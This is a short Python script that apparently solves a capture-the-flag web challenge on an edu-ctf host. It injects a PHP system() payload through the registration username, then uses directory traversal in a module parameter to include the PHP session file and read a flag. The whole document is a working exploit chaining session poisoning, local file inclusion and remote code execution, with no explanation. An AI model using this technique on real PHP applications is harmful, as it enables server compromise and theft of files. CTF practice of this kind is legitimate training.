#coding=utf-8
import requests

res = requests.post('https://edu-ctf.csie.org:10157/?action=register', 
                    verify = False,
                    data = {'user':'<?php system("cat /flag-66666666666");?>'}
)
session = res.headers['Set-Cookie'].split('=')[1].split(';')[0]

res = requests.get('https://edu-ctf.csie.org:10157/?action=module&m=../../../../../../../../var/lib/php/session/sess_{}'.format(session),
                    verify = False    
)
print res.text

